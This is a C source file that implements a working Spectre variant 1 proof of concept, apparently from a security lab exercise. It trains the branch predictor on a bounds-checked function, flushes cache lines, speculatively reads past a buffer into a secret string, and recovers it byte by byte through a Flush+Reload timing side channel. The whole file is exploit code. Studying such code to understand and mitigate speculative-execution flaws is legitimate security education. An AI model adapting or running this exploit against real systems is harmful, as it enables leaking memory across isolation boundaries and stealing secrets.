  #include <emmintrin.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>

unsigned int bound_lower = 0;
unsigned int bound_upper = 9;
uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9}; 
char    *secret    = "Some Secret Value";   
uint8_t array[256*4096];

#define CACHE_HIT_THRESHOLD (200)
#define DELTA 1024

// Sandbox Function
uint8_t restrictedAccess(size_t x)
{
  if (x <= bound_upper && x >= bound_lower) {
     return buffer[x];
  } else {
     return 0;
  } 
}

void flushSideChannel()
{
  int i;
  // Write to array to bring it to RAM to prevent Copy-on-write
  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;
  //flush the values of the array from cache
  for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 +DELTA]);
}

char reloadSideChannel()
{
  int junk=0;
  register uint64_t time1, time2;
  volatile uint8_t *addr;
  int i;
  for(i = 0; i < 256; i++){
    addr = &array[i*4096 + DELTA];
    time1 = __rdtscp(&junk);
    junk = *addr;
    time2 = __rdtscp(&junk) - time1;
    if (time2 <= CACHE_HIT_THRESHOLD){
        // printf("array[%d*4096 + %d] is in cache.\n", i, DELTA);
        // printf("The Secret = %d(%c).\n",i, i);
      return i;
    }
  } 
  return 0;
}

void spectreAttack(size_t index_beyond)
{
  int i;
  uint8_t s;
  volatile int z;
  // Train the CPU to take the true branch inside restrictedAccess().
  for (i = 0; i < 10; i++) { 
      restrictedAccess(i); 
  }
  // Flush bound_upper, bound_lower, and array[] from the cache.
  _mm_clflush(&bound_upper);
  _mm_clflush(&bound_lower);
  for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }
  for (z = 0; z < 100; z++)  {   }
  // Ask restrictedAccess() to return the secret in out-of-order execution. 
  s = restrictedAccess(index_beyond);  
  array[s*4096 + DELTA] += 88;  
}

int main() {
  int slen; 
  int t;

  for (slen = 0; secret[slen] != '\0'; ++slen);
  char sec[slen+10];

  for (t = 0; t < slen; t++) {
    flushSideChannel();
    size_t index_beyond = (size_t)(secret - (char*)buffer + t);  
    // printf("secret: %p \n", secret);
    // printf("buffer: %p \n", buffer);
    // printf("index of secret (out of bound): %ld \n", index_beyond);
    spectreAttack(index_beyond);
    sec[t] = reloadSideChannel();
  }
  sec[t] = '\0';
  printf("secret: %s \n", sec);
  return (0);
}
